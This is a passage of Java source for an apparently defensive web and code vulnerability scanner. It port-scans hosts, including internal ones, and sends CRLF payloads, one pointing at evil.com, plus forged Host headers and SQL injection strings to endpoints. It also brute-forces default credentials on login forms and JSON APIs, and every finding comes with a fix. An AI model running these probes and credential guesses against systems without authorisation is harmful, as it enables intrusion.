            if (page.status >= 200 && page.status < 300 && looksExposedSensitivePath(path, page)) {
                progress.emit("敏感路径：" + path + " -> HTTP " + page.status + "，内容匹配暴露指纹，已记录漏洞");
                findings.add(new VulnFinding(null, severityForSensitivePath(path), "敏感路径暴露", probe.toString(),
                    "常见敏感路径可被直接访问: " + path, "关闭公网访问，删除备份/配置文件，或增加认证和 IP 白名单"));
            } else {
                progress.emit("敏感路径：" + path + " -> HTTP " + page.status + "，未匹配暴露指纹");
            }
        }
    }

    private void runPortScanIfNeeded(URI baseUri, UrlScanOptions options, List<VulnFinding> findings, ScanProgress progress) {
        String host = baseUri.getHost();
        if (!options.portScanEnabled) {
            progress.emit("端口扫描：未启用，仅执行 Web 漏洞扫描");
            return;
        }
        if (!isIpv4(host)) {
            progress.emit("端口扫描：目标不是 IPv4 地址，跳过服务器端口扫描");
            return;
        }
        if (!isPublicIpv4(host)) {
            progress.emit("端口扫描：目标 " + host + " 是内网/本机/保留地址，继续扫描内网资产端口");
        }
        List<Integer> ports = parsePorts(options.portSpec, options.profile);
        progress.emit("端口扫描：目标 " + host + "，计划检测 " + ports.size() + " 个端口：" + summarizePorts(ports));
        int openCount = 0;
        for (Integer port : ports) {
            boolean open = isTcpPortOpen(host, port);
            String service = describePort(port);
            progress.emit("端口扫描：TCP " + port + " -> " + (open ? "开放" : "关闭/超时") + "，识别用途：" + service);
            if (open) {
                openCount++;
                if (isRiskyPublicPort(port)) {
                    String scope = isPublicIpv4(host) ? "公网" : "内网";
                    findings.add(new VulnFinding(null, severityForOpenPort(port), "服务器端口暴露",
                        host + ":" + port,
                        "服务器 " + scope + " 开放端口 " + port + "，用途识别为 " + service,
                        "确认该端口是否必须开放；非必要服务应关闭监听，改为 VPN/堡垒机/IP 白名单访问，并开启认证和审计"));
                }
            }
        }
        progress.emit("端口扫描：完成，发现开放端口 " + openCount + " 个");
    }

    private static boolean isTcpPortOpen(String host, int port) {
        try (Socket socket = new Socket()) {
            socket.connect(new InetSocketAddress(host, port), PORT_CONNECT_TIMEOUT_MS);
            return true;
        } catch (Exception ignored) {
            return false;
        }
    }

    private static List<Integer> parsePorts(String portSpec, String profile) {
        LinkedHashSet<Integer> ports = new LinkedHashSet<>();
        if (portSpec != null && !portSpec.isBlank()) {
            for (String part : portSpec.split("[,，\\s]+")) {
                addPortSpecPart(ports, part);
                if (ports.size() >= MAX_PORT_SCAN_COUNT) break;
            }
        }
        if (ports.isEmpty()) {
            int[] common = "deep".equalsIgnoreCase(profile)
                ? new int[] {20, 21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 465, 587, 993, 995, 1433, 1521, 2049, 2375, 2376, 3000, 3306, 3389, 5000, 5432, 5601, 5672, 5900, 6379, 8000, 8080, 8081, 8443, 9000, 9200, 9300, 11211, 27017}
                : new int[] {21, 22, 23, 25, 53, 80, 443, 445, 1433, 3306, 3389, 5432, 6379, 8080, 9200, 11211, 27017};
            for (int port : common) ports.add(port);
        }
        return ports.stream().limit(MAX_PORT_SCAN_COUNT).toList();
    }

    private static void addPortSpecPart(Set<Integer> ports, String raw) {
        if (raw == null || raw.isBlank()) return;
        String part = raw.trim();
        int dash = part.indexOf('-');
        try {
            if (dash > 0) {
                int start = Integer.parseInt(part.substring(0, dash).trim());
                int end = Integer.parseInt(part.substring(dash + 1).trim());
                if (start > end) {
                    int tmp = start;
                    start = end;
                    end = tmp;
                }
                for (int port = start; port <= end && ports.size() < MAX_PORT_SCAN_COUNT; port++) {
                    if (isValidPort(port)) ports.add(port);
                }
            } else {
                int port = Integer.parseInt(part);
                if (isValidPort(port)) ports.add(port);
            }
        } catch (Exception ignored) {
        }
    }

    private static boolean isValidPort(int port) {
        return port > 0 && port <= 65535;
    }

    private static String summarizePorts(List<Integer> ports) {
        if (ports.size() <= 24) return ports.toString();
        return ports.subList(0, 24) + " 等 " + ports.size() + " 个";
    }

    private static String describePort(int port) {
        return switch (port) {
            case 20, 21 -> "FTP 文件传输";
            case 22 -> "SSH 远程管理";
            case 23 -> "Telnet 明文远程管理";
            case 25, 465, 587 -> "SMTP 邮件服务";
            case 53 -> "DNS 域名解析";
            case 80, 8080, 8081, 8000 -> "HTTP Web 服务";
            case 110, 995 -> "POP3 邮件收取";
            case 135, 139, 445 -> "Windows RPC/SMB 文件共享";
            case 143, 993 -> "IMAP 邮件收取";
            case 443, 8443 -> "HTTPS Web 服务";
            case 1433 -> "SQL Server 数据库";
            case 1521 -> "Oracle 数据库";
            case 2049 -> "NFS 文件共享";
            case 2375 -> "Docker API 明文管理端口";
            case 2376 -> "Docker API TLS 管理端口";
            case 3000, 5000, 9000 -> "常见应用/管理后台端口";
            case 3306 -> "MySQL 数据库";
            case 3389 -> "RDP Windows 远程桌面";
            case 5432 -> "PostgreSQL 数据库";
            case 5601 -> "Kibana 管理界面";
            case 5672 -> "RabbitMQ 消息队列";
            case 5900 -> "VNC 远程桌面";
            case 6379 -> "Redis 数据库";
            case 9200, 9300 -> "Elasticsearch 服务";
            case 11211 -> "Memcached 缓存";
            case 27017 -> "MongoDB 数据库";
            default -> "未知/自定义服务";
        };
    }

    private static boolean isRiskyPublicPort(int port) {
        return switch (port) {
            case 21, 22, 23, 135, 139, 445, 1433, 1521, 2049, 2375, 2376, 3306, 3389, 5432, 5601, 5672, 5900, 6379, 9200, 9300, 11211, 27017 -> true;
            default -> false;
        };
    }

    private static String severityForOpenPort(int port) {
        return switch (port) {
            case 23, 2375, 3306, 3389, 5432, 6379, 9200, 11211, 27017 -> "HIGH";
            case 21, 135, 139, 445, 1433, 1521, 2049, 2376, 5601, 5672, 5900, 9300 -> "MEDIUM";
            default -> "LOW";
        };
    }

    private void runSystemChecks(URI baseUri, UrlScanOptions options, List<VulnFinding> findings, ScanProgress progress) {
        String host = baseUri.getHost();
        String scheme = baseUri.getScheme();
        URI origin = URI.create(scheme + "://" + host + (baseUri.getPort() > 0 ? ":" + baseUri.getPort() : ""));

        progress.emit("系统漏洞检测：开始 HTTP 方法探测...");
        probeHttpMethods(origin, options, findings, progress);
        progress.emit("系统漏洞检测：开始 CRLF 注入测试...");
        probeCrlfInjection(origin, options, findings, progress);
        progress.emit("系统漏洞检测：开始 Host 头注入测试...");
        probeHostHeaderInjection(origin, options, findings, progress);
        progress.emit("系统漏洞检测：开始源码泄露路径扫描...");
        probeSourceLeaks(origin, options, findings, progress);
        progress.emit("系统漏洞检测：开始默认凭据爆破测试...");
        probeDefaultCredentials(origin, options, findings, progress);
        progress.emit("系统漏洞检测：完成");
    }

    private void probeHttpMethods(URI baseUri, UrlScanOptions options, List<VulnFinding> findings, ScanProgress progress) {
        String[] dangerousMethods = {"TRACE", "PUT", "DELETE", "PATCH", "OPTIONS"};
        for (String method : dangerousMethods) {
            try {
                URL url = baseUri.resolve("/").toURL();
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod(method);
                conn.setConnectTimeout(8000);
                conn.setReadTimeout(8000);
                conn.setInstanceFollowRedirects(false);
                for (Map.Entry<String, String> h : options.headers.entrySet()) {
                    conn.setRequestProperty(h.getKey(), h.getValue());
                }
                int status = conn.getResponseCode();
                conn.disconnect();
                if (status < 400) {
                    String severity = "TRACE".equals(method) ? "HIGH" : "MEDIUM";
                    String desc = "服务器允许 " + method + " 方法 (HTTP " + status + ")，可能被利用进行跨站追踪攻击或任意文件操作";
                    findings.add(new VulnFinding(null, severity, "HTTP方法配置不当", baseUri.toString(),
                        desc,
                        "在 Web 服务器配置中禁用危险 HTTP 方法（TRACE/PUT/DELETE），仅保留 GET/POST/HEAD"));
                    progress.emit("HTTP方法探测：" + method + " -> " + status + "，存在风险");
                }
            } catch (Exception ignored) {}
        }
    }

    private void probeCrlfInjection(URI baseUri, UrlScanOptions options, List<VulnFinding> findings, ScanProgress progress) {
        String[] crlfPayloads = {
            "/%0d%0aSet-Cookie:crlftest=injected",
            "/%0d%0aLocation:%20http://evil.com",
            "/%0d%0aX-Injected:%20true",
        };
        for (String payload : crlfPayloads) {
            try {
                URI probe = baseUri.resolve(payload);
                PageFetch page = fetchPage(probe, options);
                String respHeaders = page.headers.toString().toLowerCase(Locale.ROOT);
                if (respHeaders.contains("crlftest") || respHeaders.contains("x-injected")) {
                    findings.add(new VulnFinding(null, "HIGH", "CRLF注入", baseUri.toString(),
                        "服务器响应中包含注入的自定义响应头，payload: " + payload,
                        "对用户输入中的 CR/LF 字符进行编码或过滤，在 URL 参数和响应头拼接处做严格校验"));
                    progress.emit("CRLF注入：payload [" + payload + "] HTTP " + page.status + "，响应已回显注入头");
                    return;
                }
            } catch (Exception ignored) {}
        }
        progress.emit("CRLF注入：未发现可利用的 CRLF 注入点");
    }

    private void probeHostHeaderInjection(URI baseUri, UrlScanOptions options, List<VulnFinding> findings, ScanProgress progress) {
        try {
            URL url = baseUri.resolve("/").toURL();
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(8000);
            conn.setReadTimeout(8000);
            conn.setInstanceFollowRedirects(false);
            conn.setRequestProperty("Host", "evil-host-injection-test.com");
            conn.setRequestProperty("User-Agent", "SecurityScanner/3.0");
            for (Map.Entry<String, String> h : options.headers.entrySet()) {
                if (!"Host".equalsIgnoreCase(h.getKey())) {
                    conn.setRequestProperty(h.getKey(), h.getValue());
                }
            }
            int status = conn.getResponseCode();
            String body = "";
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(
                status >= 400 ? conn.getErrorStream() : conn.getInputStream(), StandardCharsets.UTF_8))) {
                body = readLimited(reader, MAX_BODY_CHARS);
            }
            conn.disconnect();
            if (body.contains("evil-host-injection-test.com")) {
                findings.add(new VulnFinding(null, "MEDIUM", "Host头注入", baseUri.toString(),
                    "服务器响应中回显了伪造的 Host 头，可能导致缓存投毒或密码重置劫持",
                    "使用白名单验证 Host 头，或使用 SERVER_NAME 替代 HTTP Host 头"));
                progress.emit("Host头注入：响应回显伪造 Host，存在注入风险");
            }
        } catch (Exception ignored) {}
        progress.emit("Host头注入：未发现可利用的注入点");
    }

    private void probeSourceLeaks(URI baseUri, UrlScanOptions options, List<VulnFinding> findings, ScanProgress progress) {
        int found = 0;
        for (String leakPath : SOURCE_LEAK_PATHS) {
            URI probe = baseUri.resolve(leakPath);
            PageFetch page = fetchPage(probe, options);
            if (page.status >= 200 && page.status < 300 && !isAccessDenied(page)) {
                found++;
                findings.add(new VulnFinding(null,
                    leakPath.contains(".git") || leakPath.contains("id_rsa") || leakPath.contains("credentials") ? "CRITICAL" : "HIGH",
                    "源码/配置泄露", probe.toString(),
                    "可公开访问敏感文件: " + leakPath + " (HTTP " + page.status + ")",
                    "立即限制对该路径的访问，并检查是否已被外部下载。将敏感文件从 Web 目录移出"));
                progress.emit("源码泄露：" + leakPath + " -> HTTP " + page.status + "，可公开访问");
            }
        }
        if (found == 0) progress.emit("源码泄露：未发现可公开访问的敏感文件");
    }

    private void probeDefaultCredentials(URI baseUri, UrlScanOptions options, List<VulnFinding> findings, ScanProgress progress) {
        String[] loginPaths = {"/login", "/signin", "/admin/login", "/api/login", "/auth/login",
            "/user/login", "/account/login", "/api/v1/auth/login", "/api/auth/login"};
        String[][] formFieldSets = {
            {"username", "password"}, {"user", "pass"}, {"email", "password"},
            {"name", "pwd"}, {"account", "password"}, {"loginName", "loginPwd"}
        };
        boolean foundWeak = false;
        for (String loginPath : loginPaths) {
            URI loginUri = baseUri.resolve(loginPath);
            for (String[] cred : DEFAULT_CREDENTIALS) {
                for (String[] fields : formFieldSets) {
                    String formBody = java.net.URLEncoder.encode(fields[0], StandardCharsets.UTF_8) + "="
                        + java.net.URLEncoder.encode(cred[0], StandardCharsets.UTF_8) + "&"
                        + java.net.URLEncoder.encode(fields[1], StandardCharsets.UTF_8) + "="
                        + java.net.URLEncoder.encode(cred[1], StandardCharsets.UTF_8);
                    PageFetch postPage = fetchFormPost(loginUri, options, formBody);
                    if (postPage.error != null) continue;
                    // Success indicators: 302 redirect or 200 with Set-Cookie and no error message
                    boolean hasSetCookie = containsHeader(postPage.headers, "Set-Cookie");
                    boolean hasError = postPage.body != null && (
                        postPage.body.contains("密码错误") || postPage.body.contains("用户名或密码错误")
                        || postPage.body.contains("incorrect") || postPage.body.contains("invalid")
                        || postPage.body.contains("Invalid credentials") || postPage.body.contains("Unauthorized")
                        || postPage.body.contains("登录失败") || postPage.body.contains("账号或密码")
                        || postPage.body.contains("用户名不存在"));
                    if ((postPage.status == 302 && hasSetCookie) || (postPage.status == 200 && hasSetCookie && !hasError)) {
                        foundWeak = true;
                        findings.add(new VulnFinding(null, "CRITICAL", "默认/弱凭据", loginUri.toString(),
                            "使用默认凭据 " + cred[0] + "/" + cred[1] + " 成功登录 (HTTP " + postPage.status + ")，字段名: " + fields[0] + "/" + fields[1],
                            "立即修改默认密码，启用账户锁定策略，实施多因素认证"));
                        progress.emit("默认凭据爆破：路径 " + loginPath + " 凭据 " + cred[0] + "/" + cred[1] + " -> 登录成功！");
                        break;
                    }
                }
                if (foundWeak) break;
            }
            if (foundWeak) break;
        }
        if (!foundWeak) {
            // Also try JSON API login
            for (String loginPath : loginPaths) {
                URI loginUri = baseUri.resolve(loginPath);
                for (String[] cred : DEFAULT_CREDENTIALS) {
                    for (JsonLoginBody jsonBody : JSON_LOGIN_BODIES) {
                        String body = jsonBody.template.replace("\"admin\"", "\"" + cred[0] + "\"").replace("\"admin@test.com\"", "\"" + cred[0] + "@test.com\"");
                        PageFetch postPage = fetchPostPage(loginUri, options, body);
                        if (postPage.error != null) continue;
                        boolean hasSetCookie = containsHeader(postPage.headers, "Set-Cookie");
                        boolean hasError = postPage.body != null && (
                            postPage.body.contains("密码错误") || postPage.body.contains("用户名或密码错误")
                            || postPage.body.contains("incorrect") || postPage.body.contains("invalid")
                            || postPage.body.contains("Invalid credentials") || postPage.body.contains("Unauthorized")
                            || postPage.body.contains("登录失败") || postPage.body.contains("账号或密码"));
                        if ((postPage.status == 302 && hasSetCookie) || (postPage.status == 200 && hasSetCookie && !hasError)) {
                            foundWeak = true;
                            findings.add(new VulnFinding(null, "CRITICAL", "默认/弱凭据(API)", loginUri.toString(),
                                "使用默认凭据 " + cred[0] + "/" + cred[1] + " 通过 JSON API 成功登录 (HTTP " + postPage.status + ")",
                                "立即修改默认密码，启用账户锁定策略，实施多因素认证"));
                            progress.emit("默认凭据爆破(JSON)：路径 " + loginPath + " 凭据 " + cred[0] + "/" + cred[1] + " -> 登录成功！");
                            break;
                        }
                    }
                    if (foundWeak) break;
                }
                if (foundWeak) break;
            }
        }
        if (!foundWeak) progress.emit("默认凭据爆破：未发现弱凭据");
    }

    private void runLlmDiscovery(URI baseUri, UrlScanOptions options, VulnLlmVerifier llm, List<VulnFinding> findings, ScanProgress progress) {
        try {
            PageFetch page = fetchPage(baseUri, options);
            if (page.error != null || page.body == null || page.body.isBlank()) {
                progress.emit("AI 智能发现：目标页面无法获取或响应为空，跳过");
                return;
            }
            List<VulnFinding> discovered = llm.multiRoleDiscover(baseUri.toString(), page.body, page.headers);
            if (discovered != null && !discovered.isEmpty()) {
                for (VulnFinding f : discovered) {
                    f.setJobId(null);
                    findings.add(f);
                }
                progress.emit("AI 智能发现：6角色并行分析完成，额外发现 " + discovered.size() + " 个潜在漏洞");
            } else {
                progress.emit("AI 智能发现：大模型未发现额外的漏洞");
            }
        } catch (Exception e) {
            progress.emit("AI 智能发现：调用失败，原因：" + e.getMessage());
        }
    }

    private PageFetch fetchFormPost(URI uri, UrlScanOptions options, String formBody) {
        HttpURLConnection conn = null;
        try {
            URL url = uri.toURL();
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(15000);
            conn.setInstanceFollowRedirects(false);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 SecurityScanner/3.0");
            for (Map.Entry<String, String> header : options.headers.entrySet()) {
                conn.setRequestProperty(header.getKey(), header.getValue());
            }
            try (OutputStream os = conn.getOutputStream()) {
                os.write(formBody.getBytes(StandardCharsets.UTF_8));
                os.flush();
            }
            int status = conn.getResponseCode();
            Map<String, List<String>> headers = conn.getHeaderFields();
            String contentType = conn.getContentType();
            String body = "";
            if (isTextContent(contentType)) {
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(
                    status >= 400 ? conn.getErrorStream() : conn.getInputStream(), StandardCharsets.UTF_8))) {
                    body = readLimited(reader, MAX_BODY_CHARS);
                }
            }
            return new PageFetch(status, headers, contentType, body, null);
        } catch (Exception e) {
            return new PageFetch(0, Collections.emptyMap(), "", "", e.getMessage());
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private PageFetch fetchPage(URI uri, UrlScanOptions options) {
        HttpURLConnection conn = null;
        try {
            URL url = uri.toURL();
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(15000);
            conn.setInstanceFollowRedirects(false);
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 SecurityScanner/3.0");
            for (Map.Entry<String, String> header : options.headers.entrySet()) {
                conn.setRequestProperty(header.getKey(), header.getValue());
            }
            int status = conn.getResponseCode();
            Map<String, List<String>> headers = conn.getHeaderFields();
            String contentType = conn.getContentType();
            String body = "";
            if (isTextContent(contentType)) {
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(
                    status >= 400 ? conn.getErrorStream() : conn.getInputStream(), StandardCharsets.UTF_8))) {
                    body = readLimited(reader, MAX_BODY_CHARS);
                }
            }
            return new PageFetch(status, headers, contentType, body, null);
        } catch (Exception e) {
            return new PageFetch(0, Collections.emptyMap(), "", "", e.getMessage());
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private List<VulnFinding> verifyUrlFindings(List<VulnFinding> findings, VulnLlmVerifier llm, String targetUrl, ScanProgress progress) {
        if (findings.isEmpty()) {
            progress.emit("AI 复核：没有候选漏洞需要复核");
            return findings;
        }
        StringBuilder context = new StringBuilder("Target URL: ").append(targetUrl).append('\n');
        for (VulnFinding finding : findings) {
            context.append("- ").append(finding.getSeverity()).append(" | ")
                .append(finding.getType()).append(" | ")
                .append(finding.getLocation()).append(" | ")
                .append(finding.getDescription()).append('\n');
        }
        List<VulnFinding> verified = llm.multiRoleVerify(findings, context.toString());
        progress.emit("AI 复核：6角色并行复核，输入 " + findings.size() + " 个候选项，输出 " + (verified == null ? findings.size() : verified.size()) + " 个确认项");
        return verified == null ? findings : verified;
    }

    private List<VulnFinding> doCodeScan(String dirPath, VulnLlmVerifier llm, ScanProgress progress) {
        List<VulnFinding> findings = new ArrayList<>();
        Path root = Paths.get(dirPath);
        progress.emit("1. 校验目标：检查目录是否存在并确认可扫描");
        if (!Files.exists(root) || !Files.isDirectory(root)) {
            progress.emit("1. 校验目标：目录不存在或无法访问，扫描停止");
            findings.add(new VulnFinding(null, "MEDIUM", "路径错误", dirPath, "目录不存在或无法访问", "确认目录路径是否正确"));
            return findings;
        }
        progress.emit("2. 加载登录态：代码扫描不需要登录态，跳过");
        progress.emit("3. 扫描策略：递归扫描源代码文件，最大目录深度 8");
        Map<String, List<VulnFinding>> findingsByFile = new HashMap<>();
        Map<String, String> fileContents = new HashMap<>();
        int[] scannedFiles = new int[] {0};
        try (Stream<Path> walk = Files.walk(root, 8)) {
            walk.filter(Files::isRegularFile).filter(VulnScanServiceImpl::isSourceFile).forEach(fp -> {
                try {
                    String content = Files.readString(fp);
                    String relPath = root.relativize(fp).toString();
                    scannedFiles[0]++;
                    progress.emit("4. 爬取入口：读取源码文件 " + relPath + "，字符数 " + content.length());
                    fileContents.put(relPath, content);
                    List<VulnFinding> fileFindings = scanFileWithRules(content, relPath);
                    progress.emit("5. SQL 注入检测：文件 " + relPath + " 规则命中 " + countFindingsByType(fileFindings, "SQL注入") + " 项");
                    progress.emit("6. XSS/CSRF 检测：文件 " + relPath + " XSS 规则命中 " + countFindingsByType(fileFindings, "XSS") + " 项，CSRF 仅用于网址表单扫描");
                    progress.emit("7. 敏感路径检测：文件 " + relPath + " 硬编码密钥/路径遍历/命令注入/不安全加密命中 " + countNonWebCodeFindings(fileFindings) + " 项");
                    if (!fileFindings.isEmpty()) findingsByFile.put(relPath, fileFindings);
                } catch (Exception ignored) {
                    progress.emit("4. 爬取入口：读取文件失败 " + fp);
                }
            });
        } catch (Exception e) {
            progress.emit("扫描失败：扫描目录时出错，原因：" + e.getMessage());
            findings.add(new VulnFinding(null, "MEDIUM", "扫描错误", dirPath, "扫描目录时出错: " + e.getMessage(), "确认目录权限"));
            return findings;
        }
        progress.emit("4. 爬取入口：共扫描源码文件 " + scannedFiles[0] + " 个，发现候选文件 " + findingsByFile.size() + " 个");
        for (Map.Entry<String, List<VulnFinding>> entry : findingsByFile.entrySet()) {
            if (llm != null) {
                progress.emit("8. AI 复核与建议：调用部门模型（6角色并行）复核文件 " + entry.getKey() + " 的 " + entry.getValue().size() + " 个候选项");
                List<VulnFinding> verified = llm.multiRoleVerify(entry.getValue(), fileContents.getOrDefault(entry.getKey(), ""));
                if (verified != null) {
                    progress.emit("8. AI 复核与建议：文件 " + entry.getKey() + " 复核后确认 " + verified.size() + " 项");
                    findings.addAll(verified);
                } else {
                    progress.emit("8. AI 复核与建议：文件 " + entry.getKey() + " 模型未返回有效结果，保留规则扫描候选项");
                    findings.addAll(entry.getValue());
                }
            } else {
                progress.emit("8. AI 复核与建议：未找到可用部门模型或选择个人模型，文件 " + entry.getKey() + " 保留规则扫描候选项");
                findings.addAll(entry.getValue());
            }
        }
        if (findingsByFile.isEmpty()) {
            progress.emit("8. AI 复核与建议：没有候选漏洞需要复核");
        }
        return findings;
    }

    private static long countFindingsByType(List<VulnFinding> findings, String type) {
        return findings.stream().filter(f -> type.equals(f.getType())).count();
    }

    private static long countNonWebCodeFindings(List<VulnFinding> findings) {
        return findings.stream()
            .filter(f -> !"SQL注入".equals(f.getType()) && !"XSS".equals(f.getType()))
            .count();
    }

    private static List<VulnFinding> scanFileWithRules(String content, String relPath) {
        List<VulnFinding> findings = new ArrayList<>();
        for (Rule rule : CODE_RULES) {
            for (Pattern pattern : rule.patterns) {
                Matcher matcher = pattern.matcher(content);
                if (matcher.find()) {
                    String matched = truncate(matcher.group(), 80);
                    String description = rule.defaultDescription != null ? rule.defaultDescription : "发现潜在的 " + rule.type + " 漏洞: " + matched;
                    findings.add(new VulnFinding(null, rule.severity, rule.type, relPath, description, rule.defaultSuggestion));
                    break;
                }
            }
        }
        return findings;
    }

    private void scanForms(String html, URI pageUri, List<VulnFinding> findings, ScanProgress progress) {
        Matcher matcher = FORM_TAG.matcher(html);
        int index = 0;
        while (matcher.find()) {
            index++;
            String formTag = matcher.group();
            int formEnd = html.indexOf("</form>", matcher.end());
            String formBody = html.substring(matcher.start(), formEnd > matcher.end() ? Math.min(formEnd + 7, html.length()) : Math.min(matcher.end() + 2000, html.length()));
            String method = matchAttr(METHOD, formTag, "get").toUpperCase(Locale.ROOT);
            String action = matchAttr(ACTION, formTag, pageUri.toString());
            URI actionUri = resolveUrl(pageUri, action);
            String formLocation = actionUri != null ? actionUri.toString() : pageUri.toString();
            boolean hasCsrf = containsCsrfToken(formBody);
            boolean hasPassword = containsPasswordInput(formBody);
            progress.emit("CSRF 表单检查：页面 " + pageUri + " 表单#" + index + " method=" + method
                + " action=" + formLocation + "，CSRF token=" + (hasCsrf ? "存在" : "缺失"));
            if ("POST".equals(method) && !containsCsrfToken(formBody)) {
                findings.add(new VulnFinding(null, "HIGH", "CSRF", formLocation, "POST 表单缺少明显的 CSRF 防护 token", "为状态变更表单加入服务端校验的 CSRF token，并设置 SameSite Cookie"));
            }
            progress.emit("敏感表单检查：页面 " + pageUri + " 表单#" + index + " method=" + method
                + "，密码字段=" + (hasPassword ? "存在" : "未发现"));
            if ("GET".equals(method) && hasPassword) {
                findings.add(new VulnFinding(null, "HIGH", "敏感信息通过 GET 提交", formLocation, "密码或敏感字段所在表单使用 GET 方法，可能进入日志、历史记录和 Referer", "敏感表单必须使用 POST，并启用 HTTPS"));
            }
        }
        if (index == 0) {
            progress.emit("CSRF 表单检查：页面 " + pageUri + " 未发现表单");
        }
    }

    private void scanHtmlContent(String html, String url, List<VulnFinding> findings) {
        Matcher scriptMatcher = SCRIPT_TAG.matcher(html);
        int count = 0;
        while (scriptMatcher.find()) {
            count++;
            String rawTag = scriptMatcher.group();
            String tag = rawTag.toLowerCase(Locale.ROOT);
            if (!tag.contains("nonce=") && !tag.contains("integrity=")) {
                String tagPreview = truncate(rawTag, 120);
                boolean hasSrc = tag.contains("src=");
                String suggestion = hasSrc
                    ? "为此 script 标签添加 integrity=\"sha384-...\" 属性和 crossorigin=\"anonymous\"，格式：<script src=\"...\" integrity=\"sha384-xxx\" crossorigin=\"anonymous\"></script>。生成命令：openssl dgst -sha384 -binary file.js | openssl base64 -A"
                    : "为内联 script 添加 nonce=\"随机值\" 属性并在 CSP 头中声明：Content-Security-Policy: script-src 'nonce-随机值'";
                findings.add(new VulnFinding(null, "MEDIUM", "脚本缺少完整性保护",
                    url + " (脚本#" + count + ")",
                    "缺少 nonce/integrity 的 script 标签: " + tagPreview,
                    suggestion));
                break;
            }
        }
        Matcher inlineMatcher = INLINE_EVENT.matcher(html);
        if (inlineMatcher.find()) {
            String snippet = truncate(inlineMatcher.group(), 120);
            findings.add(new VulnFinding(null, "MEDIUM", "内联事件处理器", url,
                "发现内联事件: " + snippet,
                "将事件处理迁移到外部 JS 文件：element.addEventListener('event', handler)，并配合 CSP 禁止内联脚本"));
        }
        Matcher jsHrefMatcher = HREF_JS.matcher(html);
        if (jsHrefMatcher.find()) {
            String snippet = truncate(jsHrefMatcher.group(), 120);
            findings.add(new VulnFinding(null, "HIGH", "XSS", url,
                "发现 javascript: 协议: " + snippet,
                "移除 javascript: 伪协议，改用 element.addEventListener('click', handler) 或 <button> 元素"));
        }
    }

    private void scanPassiveHtmlSignals(String html, String url, List<VulnFinding> findings) {
        Matcher mixedMatcher = MIXED_CONTENT.matcher(html);
        if (mixedMatcher.find()) {
            findings.add(new VulnFinding(null, "MEDIUM", "混合内容", url,
                "HTTPS 页面引用 HTTP 资源: " + truncate(mixedMatcher.group(), 120),
                "将所有资源切换为 HTTPS，或使用协议相对 URL (//example.com/...)"));
        }
        Matcher commentMatcher = COMMENT_LEAK.matcher(html);
        if (commentMatcher.find()) {
            findings.add(new VulnFinding(null, "LOW", "注释信息泄露", url,
                "HTML 注释疑似含敏感信息: " + truncate(commentMatcher.group(), 120),
                "移除生产页面中的调试注释，避免泄露 TODO/FIXME/密码/Token/API-Key 等敏感线索"));
        }
        String lower = html.toLowerCase(Locale.ROOT);
        if (lower.contains("swagger-ui") || lower.contains("api-docs")) {
            findings.add(new VulnFinding(null, "MEDIUM", "接口文档暴露", url, "页面疑似暴露 Swagger/OpenAPI 文档入口", "生产环境限制接口文档访问权限或关闭公开入口"));
        }
    }

    private void scanApiPostEndpoint(URI uri, PageFetch getPage, UrlScanOptions options, List<VulnFinding> findings, ScanProgress progress) {
        String path = uri.getPath();
        progress.emit("API端点探测：路径 " + path + "，尝试 POST JSON 注入测试");
        for (JsonLoginBody loginBody : JSON_LOGIN_BODIES) {
            for (String paramName : loginBody.paramNames) {
                for (String payload : SQLI_ERROR_PAYLOADS) {
                    String poisonedBody = loginBody.template.replace("\"" + paramName + "\":\"admin\"", "\"" + paramName + "\":\"" + payload.replace("\\", "\\\\").replace("\"", "\\\"") + "\"");
                    if (poisonedBody.equals(loginBody.template)) {
                        poisonedBody = loginBody.template.replace("\"" + paramName + "\":\"admin@test.com\"", "\"" + paramName + "\":\"" + payload.replace("\\", "\\\\").replace("\"", "\\\"") + "\"");
                    }
                    PageFetch postPage = fetchPostPage(uri, options, poisonedBody);
                    if (postPage.error != null) continue;
                    if (hasSqlError(postPage.body)) {
                        findings.add(new VulnFinding(null, "CRITICAL", "SQL注入(POST API)", uri.toString(),
                            "API 端点 " + path + " 参数 " + paramName + " 注入 payload [" + truncate(payload, 40) + "] -> HTTP " + postPage.status + "，响应含 SQL 错误指纹",
                            "对 API 端点的 " + paramName + " 参数使用参数化查询，并增加接口认证和速率限制"));
                        progress.emit("API POST SQL注入：参数 " + paramName + " Payload [" + truncate(payload, 40) + "] -> HTTP " + postPage.status + "，命中 SQL 指纹");
                        return;
                    }
                }
            }
        }
        progress.emit("API端点探测：路径 " + path + " POST 注入测试完成，未发现 SQL 注入");
    }

    private PageFetch fetchPostPage(URI uri, UrlScanOptions options, String jsonBody) {
        HttpURLConnection conn = null;
        try {
            URL url = uri.toURL();
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(15000);
            conn.setInstanceFollowRedirects(false);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 SecurityScanner/3.0");
            for (Map.Entry<String, String> header : options.headers.entrySet()) {
                conn.setRequestProperty(header.getKey(), header.getValue());
            }
            try (OutputStream os = conn.getOutputStream()) {
                os.write(jsonBody.getBytes(StandardCharsets.UTF_8));
                os.flush();
            }
            int status = conn.getResponseCode();
            Map<String, List<String>> headers = conn.getHeaderFields();
            String contentType = conn.getContentType();
            String body = "";
            if (isTextContent(contentType)) {
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(
                    status >= 400 ? conn.getErrorStream() : conn.getInputStream(), StandardCharsets.UTF_8))) {
                    body = readLimited(reader, MAX_BODY_CHARS);
                }
            }
            return new PageFetch(status, headers, contentType, body, null);
        } catch (Exception e) {
